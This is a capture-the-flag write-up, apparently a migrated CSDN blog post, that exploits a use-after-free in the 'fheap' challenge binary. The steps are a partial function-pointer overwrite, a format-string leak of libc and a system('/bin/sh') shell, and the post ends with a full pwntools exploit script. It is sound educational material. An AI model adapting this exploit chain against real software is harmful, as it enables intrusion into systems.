---
layout: "single"
title: "CTF-PWN-Heap-【use after free-2】"
date: "2023-12-20 16:48:26 +0800"
categories:
  - "CTF and Pwn"
tags:
  - "PWN"
  - "CTF"
series: "CTF Writeup"
excerpt: "Then check the actual length of buf; if it is greater than 15, use malloc to allocate a heap chunk of the actual length whose pointer is dest, copy the contents of buf into it, and update the contents of ptr at the same time: the first eight bytes are the value of dest, and 24 bytes after the initial address the function address is assigned. The corresponding function is then freed twice: first free the pointer that stores the content, then free the original ptr pointer. If it is less than 15, the contents of buf are assigned directly to the beginning of ptr, and 24 bytes after the initial address the function address is assigned; the corresponding function is then freed once. Likewise, AH is the high 8 bits of ax, and AL is the low 8 bits of ax, which means ah is 33h and al is 44h."
source: "CSDN"
original_url: "https://blog.csdn.net/llovewuzhengzi/article/details/135112213"
csdn_article_id: "135112213"
migrated: true
permalink: /posts/csdn-135112213/
redirect_from:
  - "/en/CTF与Pwn/csdn-135112213/"
  - "/CTF与Pwn/csdn-135112213/"
---

{% raw %}
## fheap libc 2.23  64-bit
### Check
![Image](/images/csdn/2023/csdn-135112213/image-001-7ac0221773.png)

### main
Multiple layers of while, which is actually about the same as a selection menu
![Image](/images/csdn/2023/csdn-135112213/image-002-336868a278.png)
### create
Allocate a 0x20 heap chunk and assign the pointer to ptr
First input the size
Then input into buf
Then check the actual length of buf; if it is greater than 15, use malloc to allocate a heap chunk of the actual length whose pointer is dest, copy the contents of buf into it, and update the contents of ptr at the same time: the first eight bytes are the value of dest, and 24 bytes after the initial address the function address is assigned. The corresponding function is then freed twice: first free the pointer that stores the content, then free the original ptr pointer
If it is less than 15, the contents of buf are assigned directly to the beginning of ptr, and 24 bytes after the initial address the function address is assigned; the corresponding function is then freed once
Finally traverse the unk_2020c0 array; each array element is 16 bytes, with the first eight bytes assigned 1 and the last eight bytes assigned ptr
![Image](/images/csdn/2023/csdn-135112213/image-003-45831123ce.png)![Image](/images/csdn/2023/csdn-135112213/image-004-a55b6a50ac.png)
![Image](/images/csdn/2023/csdn-135112213/image-005-9c9c6fe6ff.png)
### delete
First check by index whether the 24 bytes after unk_2020c0 have a value; if so, this string exists. After entering yes, the free function in ptr is called with ptr as the argument, and finally the first eight bytes of unk_2020c0 at this index are set to 0![Image](/images/csdn/2023/csdn-135112213/image-006-f725ceebed.png)
## Approach
A use after free vulnerability still exists, such that when create is called we can modify the content of the function pointer stored in the heap chunk that originally held the string-related information

First create twice; at this point there are only two heap chunks, both 0x20, both storing string-related information (the function pointer called during delete). Then request a string of size 0x20; at this point a format string can be used to leak the address of some function, from which we get the libc base address, and then the address of system
Then delete the requested string and create again; now we can rewrite the function pointer in the content of the heap chunk that initially had id 1, setting it to the address of system, and the heap content just created is /bin/sh. Calling delete(1) again then successfully gets a shell

## Overwriting the Target Function Pointer
Choose the printf function pointer
When the function is loaded into memory, address randomization does not affect the low 12 bits, so at this point it may be possible to successfully overwrite the target function
![Image](/images/csdn/2023/csdn-135112213/image-007-02a1e36535.png)

![Image](/images/csdn/2023/csdn-135112213/image-008-2f2062886c.png)
## Inside printf
The test instruction (bitwise AND) checks whether the value is not zero; if so, movaps is executed

> The memory location handled by the movaps instruction must be 16-byte aligned

If it is not zero, there is no jump, and movaps will be executed; satisfying 16-byte alignment is troublesome
So we first execute the existing instruction that assigns zero to ax
![Image](/images/csdn/2023/csdn-135112213/image-009-1f2b8d5c97.png)

## Before Calling the Overwritten Function
![Image](/images/csdn/2023/csdn-135112213/image-010-dd922a130c.png)

> EAX and AX are not independent: EAX is a 32-bit register, and AX is the low 16 bits of EAX.
For example
mov eax, 12345678h
then AX will be the low 16 bits of eax, namely 5678h.
And if at this point
mov ax，3344h
then the value of eax becomes 12343344h, so assigning to ax affects eax.
Likewise, AH is the high 8 bits of ax, and AL is the low 8 bits of ax, which means ah is 33h and al is 44h.

After the jump, mov eax,0 is executed first
![Image](/images/csdn/2023/csdn-135112213/image-011-7a281179cf.png)

## The Stack When Calling printf
![Image](/images/csdn/2023/csdn-135112213/image-012-454819e1cc.png)
The 172nd entry on the stack is libc_start_main+240

![Image](/images/csdn/2023/csdn-135112213/image-013-e72c25a2ce.png)

## The Function Actually Reached
So input is still needed here; to skip this spot directly, you only need to input -1 once
![Image](/images/csdn/2023/csdn-135112213/image-014-6d0f3a5243.png)
##  Finding the libc_start_main and system Corresponding to the Current Version
![Image](/images/csdn/2023/csdn-135112213/image-015-83d8048d35.png)
![Image](/images/csdn/2023/csdn-135112213/image-016-6955884f10.png)
## Computing the libc Base Address from system
![Image](/images/csdn/2023/csdn-135112213/image-017-5a93e0ce00.png)
![Image](/images/csdn/2023/csdn-135112213/image-018-5bf96419a4.png)

![Image](/images/csdn/2023/csdn-135112213/image-019-881dc52e2a.png)


![Image](/images/csdn/2023/csdn-135112213/image-020-54d51625df.png)


##  exp

```python
from pwn import *
context(os="linux",arch="amd64",log_level="debug")
s=process("./pwn-f")
libc=ELF("./libc-2.23.so")
f=ELF("./pwn-f")
# gdb.attach(s,"b main")

def create(size,string):
    s.sendlineafter(b"3.quit\n",b"create ")
    s.sendlineafter(b"Pls give string size:",str(size))
    s.sendafter(b"str:",string)# 注意此时不能用sendlineafter，内容中会在后面有一个换行府，在覆盖函数底地址会多覆盖一个字节

def delete(id):
    s.sendlineafter(b"3.quit\n",b"delete ")
    s.sendlineafter(b"id:",str(id))
    s.sendlineafter(b"Are you sure?:",b"yes")


create(8, "ab") 
create(8, "ab") 

delete(1)
delete(0)

create(0x20, b'_libc_s_m+240:%176$pend'.ljust(0x18, b'c') + p8(0xB6))  # 0

delete(1)

s.recvuntil(b"_libc_s_m+240:")
libc_start_main_240= s.recvuntil("end", drop=True) # False是包括end

print(type(libc_start_main_240))
libc_start_main_240=int(libc_start_main_240,16) # 0x 形式的字节的转化为16进制数

system_addr = libc_start_main_240-240-0x20750+0x453a0

print("__libc_start_main_240: " + hex(libc_start_main_240))
print("system address: " + hex(system_addr))

s.sendline("-1")
delete(0)

create(0x20, b"/bin/sh;".ljust(24, b"p") + p64(system_addr))

delete(1)

s.interactive()
```
{% endraw %}
